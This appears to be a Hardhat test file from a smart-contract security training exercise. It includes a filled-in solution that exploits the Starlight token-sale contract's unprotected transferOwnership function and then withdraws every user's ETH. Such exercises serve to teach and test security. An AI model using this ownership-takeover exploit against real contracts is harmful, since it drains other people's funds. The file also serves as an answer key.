import { ethers } from 'hardhat';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { BigNumber } from 'ethers';
import { parseEther } from 'ethers/lib/utils';
import { expect } from 'chai';
import { Starlight, Starlight__factory } from '../../typechain-types';

describe('Access Control Exercise 4', function () {
	let deployer: SignerWithAddress,
		user1: SignerWithAddress,
		user2: SignerWithAddress,
		user3: SignerWithAddress,
		attacker: SignerWithAddress;

	const USER1_PURCHASE = parseEther('95');
	const USER2_PURCHASE = parseEther('65');
	const USER3_PURCHASE = parseEther('33');

	let starlight: Starlight;
	let attackerInitialETHBalance: BigNumber;

	before(async function () {
		/** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

		[deployer, user1, user2, user3, attacker] = await ethers.getSigners();

		attackerInitialETHBalance = await ethers.provider.getBalance(attacker.address);

		const StarlightFactory = (await ethers.getContractFactory(
			'contracts/access-control-4/Starlight.sol:Starlight',
			deployer
		)) as Starlight__factory;
		starlight = await StarlightFactory.deploy();

		// Users buy starlight tokens
		await starlight.connect(user1).buyTokens(USER1_PURCHASE.mul(100), user1.address, {
			value: USER1_PURCHASE,
		});
		await starlight.connect(user2).buyTokens(USER2_PURCHASE.mul(100), user2.address, {
			value: USER2_PURCHASE,
		});
		await starlight.connect(user3).buyTokens(USER3_PURCHASE.mul(100), user3.address, {
			value: USER3_PURCHASE,
		});
	});

	it('Exploit', async function () {
		/** CODE YOUR SOLUTION HERE */
		await starlight.connect(attacker).transferOwnership(attacker.address);
		await starlight.connect(attacker).withdraw();
	});

	after(async function () {
		/** SUCCESS CONDITIONS */

		// Attacker stole all the ETH from the token sale contract
		let attackerBalance = await ethers.provider.getBalance(attacker.address);
		expect(attackerBalance).to.be.gt(
			attackerInitialETHBalance.add(USER1_PURCHASE).add(USER2_PURCHASE).add(USER3_PURCHASE).sub(parseEther('0.2'))
		);
	});
});
